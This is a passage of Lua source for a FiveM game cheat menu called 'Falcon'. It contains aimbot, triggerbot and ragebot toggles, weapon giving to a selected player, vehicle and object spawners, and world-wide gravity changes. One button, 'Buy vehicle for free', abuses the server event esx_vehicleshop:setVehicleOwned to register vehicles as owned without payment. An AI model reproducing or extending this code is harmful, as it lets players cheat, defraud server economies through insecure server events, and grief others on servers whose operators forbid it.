				elseif Falcon.ComboBox("Aimbot Bone Target ~y~»", AimbotBoneOps, currAimbotBoneIndex, selAimbotBoneIndex, function(currentIndex, selectedIndex)
					currAimbotBoneIndex = currentIndex
					selAimbotBoneIndex = currentIndex
					AimbotBone = NameToBone(AimbotBoneOps[currentIndex])
				end) then
					elseif Falcon.CheckBox("Draw Aimbot FOV", DrawFov) then
					DrawFov = not DrawFov
					elseif Falcon.CheckBox("Triggerbot", Triggerbot) then
						Triggerbot = not Triggerbot
					elseif Falcon.CheckBox("~u~Ragebot", Ragebot) then
						Ragebot = not Ragebot
					end


			-- SPECIFIC WEAPON MENU
			elseif Falcon.IsMenuOpened('weaponspawner') then
				if Falcon.MenuButton('Melee Weapons', 'melee') then
				elseif Falcon.MenuButton('Pistols', 'pistol') then
				elseif Falcon.MenuButton('SMGs / MGs', 'smg') then
				elseif Falcon.MenuButton('Shotguns', 'shotgun') then
				elseif Falcon.MenuButton('Assault Rifles', 'assault') then
				elseif Falcon.MenuButton('Sniper Rifles', 'sniper') then
				elseif Falcon.MenuButton('Thrown Weapons', 'thrown') then
				elseif Falcon.MenuButton('Heavy Weapons', 'heavy') then
				end

			-- MELEE WEAPON MENU
			elseif Falcon.IsMenuOpened('melee') then
				for i = 1, #meleeweapons do
					if Falcon.Button("~r~» ~s~"..meleeweapons[i][2].."") then
						GiveWeapon(selectedPlayer, meleeweapons[i][1])
					end
				end
			-- PISTOL MENU
			elseif Falcon.IsMenuOpened('pistol') then
				for i = 1, #pistolweapons do
					if Falcon.Button("~r~» ~s~"..pistolweapons[i][2].."") then
						GiveWeapon(selectedPlayer, pistolweapons[i][1])
					elseif Falcon.Button("Remover ~b~Ammo") then
						SetPedAmmo(GetPlayerPed(-1), GetHashKey(pistolweapons[i][1]), 0)
					end
				end
			-- SMG MENU
			elseif Falcon.IsMenuOpened('smg') then
				for i = 1, #smgweapons do
					if Falcon.Button("~r~» ~s~"..smgweapons[i][2].."") then
						GiveWeapon(selectedPlayer, smgweapons[i][1])
					elseif Falcon.Button("Remover ~b~Ammo") then
						SetPedAmmo(GetPlayerPed(-1), GetHashKey(smgweapons[i][1]), 0)
					end
				end
			-- SHOTGUN MENU
			elseif Falcon.IsMenuOpened('shotgun') then
				for i = 1, #shotgunweapons do
					if Falcon.Button("~r~» ~s~"..shotgunweapons[i][2].."") then
						GiveWeapon(selectedPlayer, shotgunweapons[i][1])
						elseif Falcon.Button("Remover ~b~Ammo") then
						SetPedAmmo(GetPlayerPed(-1), GetHashKey(shotgunweapons[i][1]), 0)
					end
				end
			-- ASSAULT RIFLE MENU
			elseif Falcon.IsMenuOpened('assault') then
				for i = 1, #assaultweapons do
					if Falcon.Button("~r~» ~s~"..assaultweapons[i][2].."") then
						GiveWeapon(selectedPlayer, assaultweapons[i][1])
						elseif Falcon.Button("Remover ~b~Ammo") then
						SetPedAmmo(GetPlayerPed(-1), GetHashKey(assaultweapons[i][1]), 0)
					end
				end
			-- SNIPER MENU
			elseif Falcon.IsMenuOpened('sniper') then
				for i = 1, #sniperweapons do
					if Falcon.Button("~r~» ~s~"..sniperweapons[i][2].."") then
						GiveWeapon(selectedPlayer, sniperweapons[i][1])
						elseif Falcon.Button("Remover ~b~Ammo") then
						SetPedAmmo(GetPlayerPed(-1), GetHashKey(sniperweapons[i][1]), 0)
					end
				end
			-- THROWN WEAPON MENU
			elseif Falcon.IsMenuOpened('thrown') then
				for i = 1, #thrownweapons do
					if Falcon.Button("~r~» ~s~"..thrownweapons[i][2].."") then
						GiveWeapon(selectedPlayer, thrownweapons[i][1])
						elseif Falcon.Button("Remover ~b~Ammo") then
						SetPedAmmo(GetPlayerPed(-1), GetHashKey(thrownweapons[i][1]), 0)
					end
				end
			-- HEAVY WEAPON MENU
			elseif Falcon.IsMenuOpened('heavy') then
				for i = 1, #heavyweapons do
					if Falcon.Button("~r~» ~s~"..heavyweapons[i][2].."") then
						GiveWeapon(selectedPlayer, heavyweapons[i][1])
						elseif Falcon.Button("Remover ~b~Ammo") then
						SetPedAmmo(GetPlayerPed(-1), GetHashKey(heavyweapons[i][1]), 0)
					end
				end


			-- VEHICLE OPTIONS MENU
			elseif Falcon.IsMenuOpened('vehicle') then
				if Falcon.MenuButton("Vehicle Spawner", 'vehiclespawner') then
					elseif Falcon.MenuButton("~r~Vehicle Mods", 'vehiclemods') then
					elseif Falcon.MenuButton("Vehicle Control Menu", 'vehiclemenu') then
					elseif Falcon.ComboBox("Vehicle Functions ~y~»", {"Repair ~b~Vehicle", "Clean ~g~Vehicle", "Dirty ~c~Vehicle"}, currVFuncIndex, selVFuncIndex, function(currentIndex, selClothingIndex)
						currVFuncIndex = currentIndex
						selVFuncIndex = currentIndex
						end) then
						local veh = GetVehiclePedIsIn(PlayerPedId(), 0)
						RequestControlOnce(veh)
						if selVFuncIndex == 1 then
							FixVeh(veh)
							SetVehicleEngineOn(veh, 1, 1)
						elseif selVFuncIndex == 2 then
							SetVehicleDirtLevel(veh, 0)
						elseif selVFuncIndex == 3 then
							SetVehicleDirtLevel(veh, 15.0)
						end
					elseif Falcon.Button("Buy vehicle for free") then
					local cb = GetKeyboardInput('Enter Vehicle Spawn Name', '', 100)
					local cw = GetKeyboardInput('Enter Vehicle Licence Plate', '', 100)
					if cb and IsModelValid(cb) and IsModelAVehicle(cb) then
					RequestModel(cb)
					while not HasModelLoaded(cb) do
					Citizen.Wait(0)
					end
					local veh =
					CreateVehicle(
					GetHashKey(cb),
					GetEntityCoords(PlayerPedId(-1)),
					GetEntityHeading(PlayerPedId(-1)),
					true,
					true
						)
						SetVehicleNumberPlateText(veh, cw)
						local cx = ESX.Game.GetVehicleProperties(veh)
						TriggerServerEvent('esx_vehicleshop:setVehicleOwned', cx)
						ShowInfo('~g~~h~Success', false)
					else
						ShowInfo('~b~~h~Model is not valid!', true)
		end
					elseif Falcon.CheckBox("Drift", driftMode) then
						driftMode = not driftMode
					elseif Falcon.CheckBox("Collision", Collision) then
						Collision = not Collision
					elseif Falcon.ComboBoxSlider("Speed Multiplier", SpeedModOps, currSpeedIndex, selSpeedIndex, function(currentIndex, selectedIndex)
						currSpeedIndex = currentIndex
						selSpeedIndex = currentIndex
						SpeedModAmt = SpeedModOps[currSpeedIndex]

						if SpeedModAmt == 1.0 then
							SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(PlayerPedId(), 0), SpeedModAmt)
						else
							SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(PlayerPedId(), 0), SpeedModAmt * 20.0)
						end
					end) then
						elseif Falcon.CheckBox("Easy Handling / Stick To Floor", EasyHandling) then
						EasyHandling = not EasyHandling
						local veh = GetVehiclePedIsIn(PlayerPedId(), 0)
						if not EasyHandling then
							SetVehicleGravityAmount(veh, 9.8)
						else
							SetVehicleGravityAmount(veh, 30.0)
						end
						elseif Falcon.CheckBox("Deadly Bulldozer", DeadlyBulldozer) then
							DeadlyBulldozer = not DeadlyBulldozer
							if DeadlyBulldozer then
								local veh = SpawnVeh("BULLDOZER", 1, SpawnEngineOn)
								SetVehicleCanBreak(veh, not DeadlyBulldozer)
								SetVehicleCanBeVisiblyDamaged(veh, not DeadlyBulldozer)
								SetVehicleEnginePowerMultiplier(veh, 2500.0)
								SetVehicleEngineTorqueMultiplier(veh, 2500.0)
								SetVehicleEngineOn(veh, 1, 1, 1)
								SetVehicleGravityAmount(veh, 50.0)
								SetVehicleColours(veh, 27, 27)
								ShowInfo("~r~Go forth and devour thy enemies!\nPress ~w~E ~r~to launch a minion!")
							elseif not DeadlyBulldozer and IsPedInModel(PlayerPedId(), GetHashKey("BULLDOZER")) then
								DeleteVehicle(GetVehiclePedIsIn(PlayerPedId(), 0))
							end
						end

			-- VEHICLE SPAWNER MENU
			elseif Falcon.IsMenuOpened('vehiclespawner') then
				if Falcon.Button("Spawn Vehicle By Name") then
					local model = GetKeyboardInput("Enter Model Name:")
					SpawnVeh(model, PlaceSelf, SpawnEngineOn)
				elseif Falcon.CheckBox("Put Self Into Spawned Vehicle", PlaceSelf, "No", "Yes") then
					PlaceSelf = not PlaceSelf
				elseif Falcon.CheckBox("Spawn Planes In Air", SpawnInAir, "No", "Yes") then
					SpawnInAir = not SpawnInAir
				elseif Falcon.CheckBox("Spawn Vehicle With Engine : ", SpawnEngineOn, "No", "Yes") then
					SpawnEngineOn = not SpawnEngineOn
				elseif Falcon.MenuButton('Compacts', 'compacts') then
				elseif Falcon.MenuButton('Sedans', 'sedans') then
				elseif Falcon.MenuButton('SUVs', 'suvs') then
				elseif Falcon.MenuButton('Coupes', 'coupes') then
				elseif Falcon.MenuButton('Muscle', 'muscle') then
				elseif Falcon.MenuButton('Sports Classics', 'sportsclassics') then
				elseif Falcon.MenuButton('Sports', 'sports') then
				elseif Falcon.MenuButton('Super', 'super') then
				elseif Falcon.MenuButton('Motorcycles', 'motorcycles') then
				elseif Falcon.MenuButton('Off-Road', 'offroad') then
				elseif Falcon.MenuButton('Industrial', 'industrial') then
				elseif Falcon.MenuButton('Utility', 'utility') then
				elseif Falcon.MenuButton('Vans', 'vans') then
				elseif Falcon.MenuButton('Cycles', 'cycles') then
				elseif Falcon.MenuButton('Boats', 'boats') then
				elseif Falcon.MenuButton('Helicopters', 'helicopters') then
				elseif Falcon.MenuButton('Planes', 'planes') then
				elseif Falcon.MenuButton('Service/Emergency/Military', 'service') then
				elseif Falcon.MenuButton('Commercial/Trains', 'commercial') then
				end

			-- COMPACTS SPAWNER
			elseif Falcon.IsMenuOpened('compacts') then
				for i = 1, #compacts do
					local vehname = GetLabelText(compacts[i])
					if vehname == "NULL" then vehname = compacts[i] end -- Avoid getting NULL (for some reason GetLabelText returns null for some vehs)
					local carButton = Falcon.Button(vehname)
					if carButton then
						SpawnVeh(compacts[i], PlaceSelf, SpawnEngineOn)
					end
				end

			-- SEDANS SPAWNER
			elseif Falcon.IsMenuOpened('sedans') then
				for i = 1, #sedans do
					local vehname = GetLabelText(sedans[i])
					if vehname == "NULL" then vehname = sedans[i] end
					local carButton = Falcon.Button(vehname)
					if carButton then
						SpawnVeh(sedans[i], PlaceSelf, SpawnEngineOn)
					end
				end

			-- SUVs SPAWNER
			elseif Falcon.IsMenuOpened('suvs') then
				for i = 1, #suvs do
					local vehname = GetLabelText(suvs[i])
					if vehname == "NULL" then vehname = suvs[i] end
					local carButton = Falcon.Button(vehname)
					if carButton then
						SpawnVeh(suvs[i], PlaceSelf, SpawnEngineOn)
					end
				end

			-- COUPES SPAWNER
			elseif Falcon.IsMenuOpened('coupes') then
				for i = 1, #coupes do
					local vehname = GetLabelText(coupes[i])
					if vehname == "NULL" then vehname = coupes[i] end
					local carButton = Falcon.Button(vehname)
					if carButton then
						SpawnVeh(coupes[i], PlaceSelf, SpawnEngineOn)
					end
				end

			-- MUSCLE SPAWNER
			elseif Falcon.IsMenuOpened('muscle') then
				for i = 1, #muscle do
					local vehname = GetLabelText(muscle[i])
					if vehname == "NULL" then vehname = muscle[i] end
					local carButton = Falcon.Button(vehname)
					if carButton then
						SpawnVeh(muscle[i], PlaceSelf, SpawnEngineOn)
					end
				end

			-- SPORTSCLASSICS SPAWNER
			elseif Falcon.IsMenuOpened('sportsclassics') then
				for i = 1, #sportsclassics do
					local vehname = GetLabelText(sportsclassics[i])
					if vehname == "NULL" then vehname = sportsclassics[i] end
					local carButton = Falcon.Button(vehname)
					if carButton then
						SpawnVeh(sportsclassics[i], PlaceSelf, SpawnEngineOn)
					end
				end

			-- SPORTS SPAWNER
			elseif Falcon.IsMenuOpened('sports') then
				for i = 1, #sports do
					local vehname = GetLabelText(sports[i])
					if vehname == "NULL" then vehname = sports[i] end
					local carButton = Falcon.Button(vehname)
					if carButton then
						SpawnVeh(sports[i], PlaceSelf, SpawnEngineOn)
					end
				end

			-- SUPER SPAWNER
			elseif Falcon.IsMenuOpened('super') then
				for i = 1, #super do
					local vehname = GetLabelText(super[i])
					if vehname == "NULL" then vehname = super[i] end
					local carButton = Falcon.Button(vehname)
					if carButton then
						SpawnVeh(super[i], PlaceSelf, SpawnEngineOn)
					end
				end

			-- MOTORCYCLES SPAWNER
			elseif Falcon.IsMenuOpened('motorcycles') then
				for i = 1, #motorcycles do
					local vehname = GetLabelText(motorcycles[i])
					if vehname == "NULL" then vehname = motorcycles[i] end
					local carButton = Falcon.Button(vehname)
					if carButton then
						SpawnVeh(motorcycles[i], PlaceSelf, SpawnEngineOn)
					end
				end

			-- OFFROAD SPAWNER
			elseif Falcon.IsMenuOpened('offroad') then
				for i = 1, #offroad do
					local vehname = GetLabelText(offroad[i])
					if vehname == "NULL" then vehname = offroad[i] end
					local carButton = Falcon.Button(vehname)
					if carButton then
						SpawnVeh(offroad[i], PlaceSelf, SpawnEngineOn)
					end
				end

			-- INDUSTRIAL SPAWNER
			elseif Falcon.IsMenuOpened('industrial') then
				for i = 1, #industrial do
					local vehname = GetLabelText(industrial[i])
					if vehname == "NULL" then vehname = industrial[i] end
					local carButton = Falcon.Button(vehname)
					if carButton then
						SpawnVeh(industrial[i], PlaceSelf, SpawnEngineOn)
					end
				end

			-- UTILITY SPAWNER
			elseif Falcon.IsMenuOpened('utility') then
				for i = 1, #utility do
					local vehname = GetLabelText(utility[i])
					if vehname == "NULL" then vehname = utility[i] end
					local carButton = Falcon.Button(vehname)
					if carButton then
						SpawnVeh(utility[i], PlaceSelf, SpawnEngineOn)
					end
				end

			-- VANS SPAWNER
			elseif Falcon.IsMenuOpened('vans') then
				for i = 1, #vans do
					local vehname = GetLabelText(vans[i])
					if vehname == "NULL" then vehname = vans[i] end
					local carButton = Falcon.Button(vehname)
					if carButton then
						SpawnVeh(vans[i], PlaceSelf, SpawnEngineOn)
					end
				end

			-- CYCLES SPAWNER
			elseif Falcon.IsMenuOpened('cycles') then
				for i = 1, #cycles do
					local vehname = GetLabelText(cycles[i])
					if vehname == "NULL" then vehname = cycles[i] end
					local carButton = Falcon.Button(vehname)
					if carButton then
						SpawnVeh(cycles[i], PlaceSelf, SpawnEngineOn)
					end
				end

			-- BOATS SPAWNER
			elseif Falcon.IsMenuOpened('boats') then
				for i = 1, #boats do
					local vehname = GetLabelText(boats[i])
					if vehname == "NULL" then vehname = boats[i] end
					local carButton = Falcon.Button(vehname)
					if carButton then
						SpawnVeh(boats[i], PlaceSelf, SpawnEngineOn)
					end
				end

			-- HELICOPTERS SPAWNER
			elseif Falcon.IsMenuOpened('helicopters') then
				for i = 1, #helicopters do
					local vehname = GetLabelText(helicopters[i])
					if vehname == "NULL" then vehname = helicopters[i] end
					local carButton = Falcon.Button(vehname)
					if carButton then
						SpawnVeh(helicopters[i], PlaceSelf, SpawnEngineOn)
					end
				end

			-- PLANES SPAWNER
			elseif Falcon.IsMenuOpened('planes') then
				for i = 1, #planes do
					local vehname = GetLabelText(planes[i])
					if vehname == "NULL" then vehname = planes[i] end
					local carButton = Falcon.Button(vehname)
					if carButton then
						SpawnPlane(planes[i], PlaceSelf, SpawnInAir)
					end
				end

			-- SERVICE SPAWNER
			elseif Falcon.IsMenuOpened('service') then
				for i = 1, #service do
					local vehname = GetLabelText(service[i])
					if vehname == "NULL" then vehname = service[i] end
					local carButton = Falcon.Button(vehname)
					if carButton then
						SpawnVeh(service[i], PlaceSelf, SpawnEngineOn)
					end
				end

			-- COMMERCIAL SPAWNER
			elseif Falcon.IsMenuOpened('commercial') then
				for i = 1, #commercial do
					local vehname = GetLabelText(commercial[i])
					if vehname == "NULL" then vehname = commercial[i] end
					local carButton = Falcon.Button(vehname)
					if carButton then
						SpawnVeh(commercial[i], PlaceSelf, SpawnEngineOn)
					end
				end

			-- VEHICLE MODS MENU
			elseif Falcon.IsMenuOpened('vehiclemods') then
				if Falcon.MenuButton("Vehicle Colors", 'vehiclecolors') then
					elseif Falcon.MenuButton("Tune Vehicle", 'vehicletuning') then
					elseif Falcon.Button("Set Plate Text (8 Characters)") then
						local plateInput = GetKeyboardInput("Enter Plate Text (8 Characters):")
						RequestControlOnce(GetVehiclePedIsIn(PlayerPedId(), 0))
						SetVehicleNumberPlateText(GetVehiclePedIsIn(PlayerPedId(), 0), plateInput)
					elseif Falcon.Button("~h~~r~R~p~a~y~i~m~n~b~b~g~o~o~w ~w~Vehicle Colour") then
				ra = RGBRainbow(1.0)
				SetVehicleCustomPrimaryColour(GetVehiclePedIsUsing(PlayerPedId()), ra.r, ra.g, ra.b)
				SetVehicleCustomSecondaryColour(GetVehiclePedIsUsing(PlayerPedId()), ra.r, ra.g, ra.b)
				elseif Falcon.Button("~h~~r~R~p~a~y~i~m~n~b~b~g~o~o~w ~w~Vehicle Neon") then
				local u48y34 = RGBRainbow(1.0)
				local ped = PlayerPedId()
				local veh = GetVehiclePedIsUsing(ped)
					SetVehicleNeonLightEnabled(veh, 0, true)
					SetVehicleNeonLightEnabled(veh, 0, true)
					SetVehicleNeonLightEnabled(veh, 1, true)
					SetVehicleNeonLightEnabled(veh, 2, true)
					SetVehicleNeonLightEnabled(veh, 3, true)
					SetVehicleNeonLightsColour(GetVehiclePedIsUsing(PlayerPedId(-1)), u48y34.r, u48y34.g, u48y34.b)
				 end

			-- VEHICLE COLORS MENU
			elseif Falcon.IsMenuOpened('vehiclecolors') then
				if Falcon.MenuButton("Primary Color", 'vehiclecolors_primary') then
					elseif Falcon.MenuButton("Secondary Color", 'vehiclecolors_secondary') then

				end

			elseif Falcon.IsMenuOpened('vehiclecolors_primary') then
				if Falcon.MenuButton("Classic Colors", 'primary_classic') then
					elseif Falcon.MenuButton("Matte Colors", 'primary_matte') then
					elseif Falcon.MenuButton("Metals", 'primary_metal') then
				end

			elseif Falcon.IsMenuOpened('vehiclecolors_secondary') then
				if Falcon.MenuButton("Classic Colors", 'secondary_classic') then
					elseif Falcon.MenuButton("Matte Colors", 'secondary_matte') then
					elseif Falcon.MenuButton("Metals", 'secondary_metal') then
				end

			-- PRIMARY CLASSIC
			elseif Falcon.IsMenuOpened('primary_classic') then
				for i = 1, #classicColors do
					if Falcon.Button(classicColors[i][1]) then
						local veh = GetVehiclePedIsIn(PlayerPedId(), 0)
						local prim, sec = GetVehicleColours(veh)
						SetVehicleColours(veh, classicColors[i][2], sec)
					end
				end

			-- PRIMARY MATTE
			elseif Falcon.IsMenuOpened('primary_matte') then
				for i = 1, #matteColors do
					if Falcon.Button(matteColors[i][1]) then
						local veh = GetVehiclePedIsIn(PlayerPedId(), 0)
						local prim, sec = GetVehicleColours(veh)
						SetVehicleColours(veh, matteColors[i][2], sec)
					end
				end

			-- PRIMARY METAL
			elseif Falcon.IsMenuOpened('primary_metal') then
				for i = 1, #metalColors do
					if Falcon.Button(metalColors[i][1]) then
						local veh = GetVehiclePedIsIn(PlayerPedId(), 0)
						local prim, sec = GetVehicleColours(veh)
						SetVehicleColours(veh, metalColors[i][2], sec)
					end
				end

			-- SECONDARY CLASSIC
			elseif Falcon.IsMenuOpened('secondary_classic') then
				for i = 1, #classicColors do
					if Falcon.Button(classicColors[i][1]) then
						local veh = GetVehiclePedIsIn(PlayerPedId(), 0)
						local prim, sec = GetVehicleColours(veh)
						SetVehicleColours(veh, prim, classicColors[i][2])
					end
				end

			-- SECONDARY MATTE
			elseif Falcon.IsMenuOpened('secondary_matte') then
				for i = 1, #matteColors do
					if Falcon.Button(matteColors[i][1]) then
						local veh = GetVehiclePedIsIn(PlayerPedId(), 0)
						local prim, sec = GetVehicleColours(veh)
						SetVehicleColours(veh, prim, matteColors[i][2])
					end
				end

			-- SECONDARY METAL
			elseif Falcon.IsMenuOpened('secondary_metal') then
				for i = 1, #metalColors do
					if Falcon.Button(metalColors[i][1]) then
						local veh = GetVehiclePedIsIn(PlayerPedId(), 0)
						local prim, sec = GetVehicleColours(veh)
						SetVehicleColours(veh, prim, metalColors[i][2])
					end
				end

			-- VEHICLE TUNING MENU
			elseif Falcon.IsMenuOpened('vehicletuning') then
			   if Falcon.Button("Max ~r~Exterior Tuning") then
						MaxOut(GetVehiclePedIsUsing(PlayerPedId()))
			elseif Falcon.Button("Max ~r~Performance") then
						engine(GetVehiclePedIsUsing(PlayerPedId()))
			elseif Falcon.Button("Max All ~r~Tuning") then
						engine1(GetVehiclePedIsUsing(PlayerPedId()))
			end


			-- VEHICLE MENU (WIP)
			elseif Falcon.IsMenuOpened('vehiclemenu') then
				if Falcon.CheckBox("Save Personal Vehicle", SavedVehicle, "None", "Saved Vehicle: "..pvehicleText) then
					if IsPedInAnyVehicle(PlayerPedId(), 0) and not SavedVehicle then
						SavedVehicle = not SavedVehicle
						RemoveBlip(pvblip)
						local vehicle = GetVehiclePedIsIn(PlayerPedId(), 0)
						pvehicle = GetVehiclePedIsIn(PlayerPedId(), 0)
						pvblip = AddBlipForEntity(pvehicle)
						SetBlipSprite(pvblip, 225) -- Full list of blips https://marekkraus.sk/gtav/blips/list.html
						SetBlipColour(pvblip, 84) -- Full list of the available blips colors https://i.imgur.com/Hvyx6cE.png
						ShowInfo("~g~Current Vehicle Saved")
						pvehicleText = GetLabelText(GetDisplayNameFromVehicleModel(GetEntityModel(pvehicle))).." "..pvehicle
					elseif SavedVehicle then
						SavedVehicle = not SavedVehicle
						pvehicle = nil
						RemoveBlip(pvblip)
						ShowInfo("~b~Saved Vehicle Blip Removed")
					else
						ShowInfo("~r~You are not in a vehicle!")
					end

					-- Whenever the entity changes, the blip and entity needs to be reseted. Lots of other checks need to be made. (WIP)

				elseif Falcon.CheckBox("Left Front Door", LeftFrontDoor, "Closed", "Opened") then
					LeftFrontDoor = not LeftFrontDoor
					local vehicle = GetVehiclePedIsIn(PlayerPedId(), 0)
					if LeftFrontDoor then
						SetVehicleDoorOpen(vehicle, 0, nil, true)
					elseif not LeftFrontDoor then
						SetVehicleDoorShut(vehicle, 0, true)
					end
				elseif Falcon.CheckBox("Right Front Door", RightFrontDoor, "Closed", "Opened") then -- Is closing when the driver seat has someone
					RightFrontDoor = not RightFrontDoor
					local vehicle = GetVehiclePedIsIn(PlayerPedId(), 0)
					if RightFrontDoor then
						SetVehicleDoorOpen(vehicle, 1, nil, true)
					elseif not RightFrontDoor then
						SetVehicleDoorShut(vehicle, 1, true)
					end
				elseif Falcon.CheckBox("Left Back Door", LeftBackDoor, "Closed", "Opened") then
					LeftBackDoor = not LeftBackDoor
					local vehicle = GetVehiclePedIsIn(PlayerPedId(), 0)
					if LeftBackDoor then
						SetVehicleDoorOpen(vehicle, 2, nil, true)
					elseif not LeftBackDoor then
						SetVehicleDoorShut(vehicle, 2, true)
					end
				elseif Falcon.CheckBox("Right Back Door", RightBackDoor, "Closed", "Opened") then
					RightBackDoor = not RightBackDoor
					local vehicle = GetVehiclePedIsIn(PlayerPedId(), 0)
					if RightBackDoor then
						SetVehicleDoorOpen(vehicle, 3, nil, true)
					elseif not RightBackDoor then
						SetVehicleDoorShut(vehicle, 3, true)
					end
				elseif Falcon.CheckBox("Hood", FrontHood, "Closed", "Opened") then
					FrontHood = not FrontHood
					local vehicle = GetVehiclePedIsIn(PlayerPedId(), 0)
					if FrontHood then
						SetVehicleDoorOpen(vehicle, 4, nil, true)
					elseif not FrontHood then
						SetVehicleDoorShut(vehicle, 4, true)
					end
				elseif Falcon.CheckBox("Trunk", Trunk, "Closed", "Opened") then
					Trunk = not Trunk
					local vehicle = GetVehiclePedIsIn(PlayerPedId(), 0)
					if Trunk then
						SetVehicleDoorOpen(vehicle, 5, nil, true)
					elseif not Trunk then
						SetVehicleDoorShut(vehicle, 5, true)
					end
				elseif Falcon.CheckBox("Back", Back, "Closed", "Opened") then
					Back = not Back
					local vehicle = GetVehiclePedIsIn(PlayerPedId(), 0)
					if Back then
						SetVehicleDoorOpen(vehicle, 6, nil, true)
					elseif not Back then
						SetVehicleDoorShut(vehicle, 6, true)
					end
				elseif Falcon.CheckBox("Back 2", Back2, "Closed", "Opened") then
					Back2 = not Back2
					local vehicle = GetVehiclePedIsIn(PlayerPedId(), 0)
					if Back2 then
						SetVehicleDoorOpen(vehicle, 7, nil, true)
					elseif not Back2 then
						SetVehicleDoorShut(vehicle, 7, true)
					end
				end

			-- WORLD OPTIONS MENU
			elseif Falcon.IsMenuOpened('world') then
				if Falcon.MenuButton("Weather Changer ~r~(CLIENT SIDE)", 'weather') then
				elseif Falcon.MenuButton("Time Changer", 'time') then
				elseif Falcon.CheckBox("Disable Cars", CarsDisabled) then
					CarsDisabled = not CarsDisabled
				elseif Falcon.CheckBox("Disable Guns", GunsDisabled) then
					GunsDisabled = not GunsDisabled
				elseif Falcon.CheckBox("Clear Streets", ClearStreets) then
					ClearStreets = not ClearStreets
				elseif Falcon.CheckBox("Noisy Cars", NoisyCars) then
					NoisyCars = not NoisyCars
					if not NoisyCars then
						for k in EnumerateVehicles() do
							SetVehicleAlarmTimeLeft(k, 0)
						end
					end
				elseif Falcon.ComboBoxSlider("Gravity Amount", GravityOpsWords, currGravIndex, selGravIndex, function(currentIndex, selectedIndex)
					currGravIndex = currentIndex
					selGravIndex = currentIndex
					GravAmount = GravityOps[currGravIndex]

					for k in EnumerateVehicles() do
						RequestControlOnce(k)
						SetVehicleGravityAmount(k, GravAmount)
					end
				end) then
				end

				 elseif Falcon.IsMenuOpened('time') then
				  if Falcon.CheckBox("Christmas Weather", XMAS) then
					XMAS = not XMAS
					if XMAS then
							SetForceVehicleTrails(true)
				SetForcePedFootstepsTracks(true)
						SetWeatherTypePersist("XMAS")
			SetWeatherTypeNowPersist("XMAS")
			SetWeatherTypeNow("XMAS")
			SetOverrideWeather("XMAS")
			end
					elseif Falcon.CheckBox("Blizzard Weather", BLIZZARD) then
					BLIZZARD = not BLIZZARD
					if BLIZZARD then
			SetWeatherTypePersist("BLIZZARD")
			SetWeatherTypeNowPersist("BLIZZARD")
			SetWeatherTypeNow("BLIZZARD")
			SetOverrideWeather("BLIZZARD")
			end
			elseif Falcon.CheckBox("Foggy Weather", FOGGY) then
					FOGGY = not FOGGY
					if FOGGY then
									SetWeatherTypePersist("FOGGY")
			SetWeatherTypeNowPersist("FOGGY")
			SetWeatherTypeNow("FOGGY")
			SetOverrideWeather("FOGGY")
			end
		end






			-- OBJECT SPAWNER MENU
			elseif Falcon.IsMenuOpened('objectspawner') then
				if Falcon.MenuButton("Spawned Objects", 'objectlist') then
				elseif Falcon.ComboBox("~g~Select~s~ To Object~h~~y~ »", objs_tospawn, currObjIndex, selObjIndex, function(currentIndex, selectedIndex)
					currObjIndex = currentIndex
					selObjIndex = currentIndex
					obj = objs_tospawn[currObjIndex]
					end) then
				elseif Falcon.Button("~g~Spawn ~s~Object") then
					local pos = GetEntityCoords(PlayerPedId())
					local pitch = GetEntityPitch(PlayerPedId())
					local roll = GetEntityRoll(PlayerPedId())
					local yaw = GetEntityRotation(PlayerPedId()).z
					local xf = GetEntityForwardX(PlayerPedId())
					local yf = GetEntityForwardY(PlayerPedId())
					local spawnedObj = nil
					if currDirectionIndex == 1 then
						spawnedObj = CreateObject(GetHashKey(obj), pos.x + (xf * 10), pos.y + (yf * 10), pos.z - 1, 1, 1, 1)
					elseif currDirectionIndex == 2 then
						spawnedObj = CreateObject(GetHashKey(obj), pos.x - (xf * 10), pos.y - (yf * 10), pos.z - 1, 1, 1, 1)
					end
					SetEntityRotation(spawnedObj, pitch, roll, yaw + ObjRotation)
					SetEntityVisible(spawnedObj, objVisible, 0)
					FreezeEntityPosition(spawnedObj, 1)
					table.insert(SpawnedObjects, spawnedObj)
				elseif Falcon.Button("Add Object By Name") then
					local testObj = GetKeyboardInput("Enter Object Model Name:")
					local pos = GetEntityCoords(PlayerPedId())
					local addedObj = CreateObject(GetHashKey(testObj), pos.x, pos.y, pos.z - 100, 0, 1, 1)
					SetEntityVisible(addedObj, 0, 0)
					if table.contains(objs_tospawn, testObj) then
						ShowInfo("~b~Model " .. testObj .. " is already spawnable!")
					elseif DoesEntityExist(addedObj) then
						objs_tospawn[#objs_tospawn + 1] = testObj
						ShowInfo("~g~Model " .. testObj .. " has been added to the list!")
					else
						ShowInfo("~r~Model " .. testObj .. " does not exist!")
					end
					RequestControlOnce(addedObj)
					DeleteObject(addedObj)
				elseif Falcon.CheckBox("Visible", objVisible) then
					objVisible = not objVisible
				elseif Falcon.ComboBox("Direction", {"front", "back"}, currDirectionIndex, selDirectionIndex, function(currentIndex, selectedIndex)
					currDirectionIndex = currentIndex
					selDirectionIndex = currentIndex
				end) then
				elseif Falcon.ComboBox("Rotation", RotationOps, currRotationIndex, selRotationIndex, function(currentIndex, selectedIndex)
					currRotationIndex = currentIndex
					selRotationIndex = currentIndex
					ObjRotation = RotationOps[currRotationIndex]
					end) then
				end


			-- SPAWNED OBJECTS MENU
			elseif Falcon.IsMenuOpened('objectlist') then
				if Falcon.Button("Delete All Spawned Objects") then for i = 1, #SpawnedObjects do RequestControlOnce(SpawnedObjects[i])DeleteObject(SpawnedObjects[i]) end
				else
					for i = 1, #SpawnedObjects do
						if DoesEntityExist(SpawnedObjects[i]) then
							if Falcon.Button("OBJECT [" .. i .. "] WITH ID " .. SpawnedObjects[i]) then
								RequestControlOnce(SpawnedObjects[i])
								DeleteObject(SpawnedObjects[i])
							end
						end
					end
				end

			-- WEATHER CHANGER MENU
			elseif Falcon.IsMenuOpened('weather') then
				if Falcon.ComboBox("Weather Type", WeathersList, currWeatherIndex, selWeatherIndex, function(currentIndex, selectedIndex)
							 currWeatherIndex = currentIndex
							 selWeatherIndex = currentIndex
							 WeatherType = WeathersList[currentIndex]
				end) then
				elseif Falcon.CheckBox("Weather Changer", WeatherChanger, "Disabled", "Enabled") then
				  WeatherChanger = not WeatherChanger
				end

			-- MISC OPTIONS MENU
			elseif Falcon.IsMenuOpened('misc') then

				if Falcon.MenuButton("ESP & Visual", 'esp') then
				elseif Falcon.MenuButton("~h~∑~r~Info", "InfoMenu") then
